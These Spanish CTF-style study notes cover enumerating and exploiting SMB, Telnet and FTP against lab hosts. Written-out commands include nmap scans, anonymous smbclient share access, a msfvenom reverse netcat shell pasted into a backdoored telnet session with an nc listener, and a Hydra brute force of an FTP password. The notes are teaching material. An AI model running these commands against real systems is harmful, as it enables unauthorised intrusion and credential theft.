1) ENTENDIENDO SMB:
    Es un protocolo de comunicación cliente-servidor que se utiliza para compartir el acceso de archivos, impresoras, puertos serie y otros
    recursos en una red. 
    El protocolo SMB se conoce como protocolo de solicitud de respuesta, lo que significa que transmite múltiples mensajes entre el cliente y 
    el servidor para establecer una conexión. Los clientes se conectan a los servidores mediante TCP / IP (en realidad NetBIOS sobre TCP / IP 
    como se especifica en RFC1001 y RFC1002), NetBEUI o IPX / SPX.

    Los sistemas operativos Microsoft Windows desde Windows 95 han incluido compatibilidad con el protocolo SMB de cliente y servidor. Samba, 
    un servidor de código abierto que admite el protocolo SMB, fue lanzado para sistemas Unix.

2) ENUMERACION DE SMB
    La enumeración es el proceso de recopilar información sobre un objetivo para encontrar posibles vectores de ataque y ayudar en la explotación.

        SMB:
            Normalmente, hay unidades compartidas SMB en un servidor que se pueden conectar y utilizar para ver o transferir archivos.
        
        Escaneo de puertos:

            nmap -A -p-
                -A = Habilitar la deteccion del sistema operativo, versiones, escaneo de scripts y traceroute, todo en uno.

        Enum4Linux:

            Es una herramienta que se utiliza para enumerar recursos compartidos SMB tanto en sistemas windows como Linux.
            SINTAXIS:
                enum4linux [opciones] ip 
            
            OPCIONES:
                -U = Obtener lista de usuarios
                -M = Obtener lista de máquinas
                -N = Obtener volcado de lista de nombres 
                -S = Obtener lista compartida 
                -P = Obtener información de política de contraseñas.
                -G = Obtener lista de miembros y grupos.
                -A = Todo lo anterior, enumeracion básica completa.

        Puertos SMB:
            139/445

3) EXPLOTACION SMB 

    TIPOS DE EXPLOTACION SMB:
        Si bien existen vulnerabilidades como CVE-2017-7494 que pueden permitir la ejecución remota de código mediante la explotación de SMB, es más probable que 
        encuentre una situación en la que la mejor manera de ingresar a un sistema se deba a configuraciones incorrectas en el sistema. En este caso, vamos a explotar 
        el acceso compartido anónimo de SMB, una configuración errónea común que puede permitirnos obtener información que nos llevará a un shell.

    DESGLOSE DEL MÉTODO:
        Entonces de nuestra etapa de enumeración sabemos:
            - La ubicación del recurso compartido SMB
            - El nombre de una acción SMB interesante
    
    SMBCLIENT: 
        Debido a que estamos intentando acceder a un recurso compartido de SMB, necesitamos un cliente para acceder a los recursos en los servidores. Usaremos "SMBclient"
        por que es parte de la suite samba predeterminada.
        Accedemos de forma remota al recurso compartido SMB con la siguiente sintaxis:
            smbclient //IP/SHARE
            Seguido de las etiquetas:
                -U = especificar usuario
                -p = especificar el puerto
                Ejemplos: 
                    smbclient //10.10.10.2/secret -U suit -p 445

4) TELNET:
        Telnet es un protocolo de aplicación que le permite, con el uso de un cliente telnet, conectarse y ejecutar comandos en una máquina remota que aloja un servidor 
        telnet.

        REMPLAZO:
            Telnet envia todos los mensajes en texto sin cifrar y no tiene mecanismos de seguridad específicos. Por lo que suele ser remplazado por ssh.

        SINTAXIS:
            telnet [ip] [puerto]

5) ENUMERACION TELNET:

    sudo nmap -p- -sS --min-rate 5000 -n 10.10.90.80 
    sudo nmap -p 8012 -sS -sC -sV --min-rate 5000 -n 10.10.90.80

6) EXPLOTACIÓN TELNET 

    Telnet, al ser un protocolo, es en sí mismo inseguro por las razones de las que hablamos anteriormente. Carece de cifrado, por lo que envía toda la 
    comunicación en texto plano y, en su mayor parte, tiene un control de acceso deficiente. Sin embargo, existen CVE para sistemas cliente y servidor Telnet, 
    por lo que cuando explote, puede verificar los siguientes:

    https://www.cvedetails.com/
    https://cve.mitre.org/

    Un CVE, abreviatura de Common Vulnerabilities and Exposures, es una lista de fallas de seguridad informática divulgadas públicamente. Cuando alguien se 
    refiere a un CVE, generalmente se refiere al número de identificación de CVE asignado a una falla de seguridad.

    DESGLOSE DEL MÉTODO:
        Entonces, de nuestra etapa de enumeración, sabemos:
            -- Hay un servicio telnet mas oculto que se ejecuta en esta maquina.
            -- El servicio en sí está marcado como "puerta trasera"
            -- Tenemos posible nombre de usuario de "skidy" implicado.

    Conexion a telnet:
        telnet [ip] [puerto]

    Empezamos:
        ¡Es una conexión telnet abierta! ¿Qué mensaje de bienvenida recibimos?:
        
        Inicie un oyente tcpdump en su máquina local;
            sudo tcpdump ip proto \\icmp -i tun0
                Esto inicia un oyente tcpdump, específicamente escuchando el tráfico ICMP, en el que operan los pings.
        
        Si tenemos respuesta en tcpdump
            ¡Estupendo! Esto significa que podemos ejecutar comandos del sistema Y que podemos llegar a nuestra máquina local. ¡Ahora divirtámonos un poco!
        Vamos a generar una carga útil de shell inverso usando msfvenom, que generará y codificará un shell inverso de netcat para nosotros. 
        Aquí está nuestra sintaxis:
            msfvenom -p cmd/unix/reverse_netcat lhost=10.8.185.215 lport=4444 R
                -p = carga útil
                lhost = nuestra dirección IP de host local (esta es su
                lport = el puerto para escuchar (este es el puerto en su
                R = exportar la carga útil en formato sin procesar
        
        ¿Con qué palabra comienza la carga útil generada?
            mkfifo
        
        Perfecto. Ya casi llegamos. Ahora todo lo que tenemos que hacer es iniciar un detector de netcat en nuestra máquina local. Hacemos esto usando:
            "nc -lvp [puerto de escucha]"
                nc -lvp 4444
        ¡Estupendo! Ahora que se está ejecutando, debemos copiar y pegar nuestra carga útil msfvenom en la sesión de telnet y ejecutarla como un comando. 
        Con suerte, ¡esto nos dará un caparazón en la máquina objetivo!

7) ENTENDIENDO FTP:

        Es un protocolo de transferencia de archivos.

    ¿COMO FUNCIONA?:

        Funciona con dos enlaces:
            @   Un canal de comando (a veces llamado control)
            @   Un canal de datos

        FTP funciona con un protocolo cliente-servidor. El cliente inicia una conexion con el servidor, el servidor valida las credenciales de inicio de 
        sesion proporcionadas y luego habre la sesion.

    ACTIVO VS PASIVO

        El servidor FTP puede admitir conexiones activas o pasivas, o ambas.
            @   El una conexion FTP activa, el cliente abre un puerto y escucha. Se requiere que el servidor se conecte activamente a él.
            @   En una conexión FTP pasiva, el servidor abre un puerto y escucha (pasivamente) y el cliente se conecta a él.

        Esta separación de información de comando y datos en canales separados es una forma de poder enviar comandos al servidor sin tener que esperar a 
        que finalice la transferencia de datos actual. Si ambos canales estuvieran interconectados, solo podría ingresar comandos entre transferencias de datos, 
        lo que no sería eficiente para transferencias de archivos grandes o conexiones lentas de Internet.

        Mas info https://www.ietf.org/rfc/rfc959.txt 

8) ENUMERACION FTP

    MÉTODO:
        Vamos a explotar un inicio de sesión FTP anónimo, para ver a qué archivos podemos acceder y si contienen información que nos permita abrir un shell en 
        el sistema. Esta es una vía común en los desafíos de CTF e imita una implementación descuidada de la vida real de los servidores FTP.
    
    RECURSOS:

        Como vamos a iniciar sesión en un servidor FTP, necesitaremos asegurarnos de que haya un cliente ftp instalado en el sistema. Debería haber uno instalado
        por defecto en la mayoría de los sistemas operativos Linux, como Kali o Parrot OS. Puede probar si hay uno escribiendo "ftp" en la consola. Si está comprado 
        con un mensaje que dice: "ftp>", entonces tiene un cliente FTP en funcionamiento en su sistema. Si no, es una simple cuestión de usar "sudo apt install ftp" 
        para instalar uno.

    MÉTODOS DE ENUMERACIÓN ALTERNATIVOS

        Vale la pena señalar que algunas versiones vulnerables de in.ftpd y algunas otras variantes del servidor FTP devuelven diferentes respuestas al comando 
        "cwd" para los directorios de inicio que existen y los que no. Esto se puede aprovechar porque puede emitir comandos cwd antes de la autenticación, y si hay 
        un directorio de inicio, es muy probable que haya una cuenta de usuario que lo acompañe. Si bien este error se encuentra principalmente en sistemas heredados, 
        vale la pena conocerlo como una forma de explotar FTP.

        Esta vulnerabilidad está documentada en: https://www.exploit-db.com/exploits/20745 

9) EXPLOTACIÓN DE FTP

    TIPOS DE EXPLOTACION FTP:

        De manera similar a Telnet, cuando se usa FTP, tanto los canales de comandos como los de datos no están encriptados. Cualquier dato enviado a través de 
        estos canales se puede interceptar y leer.

        Con los datos de FTP enviados en texto plano, si se produjera un ataque de intermediario, un atacante podría revelar cualquier cosa enviada a través de 
        este protocolo (como contraseñas). Un artículo escrito porJSCape  demuestra y explica este proceso usando ARP-Poisoning para engañar a una víctima para 
        que envíe información confidencial a un atacante, en lugar de una fuente legítima.

        Cuando miramos un servidor FTP desde la posición en la que nos encontramos para esta máquina, una vía que podemos aprovechar son las configuraciones de 
        contraseña débiles o predeterminadas.

    DESGLOSE DEL MÉTODO:

        Entonces, de nuestra etapa de enumeración, sabemos:
            @ Hay un servidor FTP ejecutándose en esta máquina.
            @ Tenemos un posible nombre de usuario
        
        Con esta información intentaremos realizar fuerza bruta a la contraseña del servidor FTP.

    HYDRA

        Hydra es una herramienta de descifrado de contraseñas en línea muy rápida, que puede realizar ataques rápidos de diccionario contra más de 50 protocolos, 
        incluidos Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, varias bases de datos y mucho más. Hydra viene por defecto tanto en Parrot como en Kali, sin embargo, 
        si lo necesita, puede encontrar el GitHub aquí.

        La sintaxis que usaremos es la siguiente:

            hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp

                -t == Número de conexiones paralelas por objetivo
                -l == Usuario de la cuenta a atacar.
                -P == Ruta del diccionario
                -vV == Establece el modo detallado en muy detallado.
                ftp == Protocolo de la maquina destino.

Aquí hay algunas cosas que pueden ser útiles para leer después de completar esta sala, si le interesa:

https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
https://attack.mitre.org/techniques/T1210/
https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
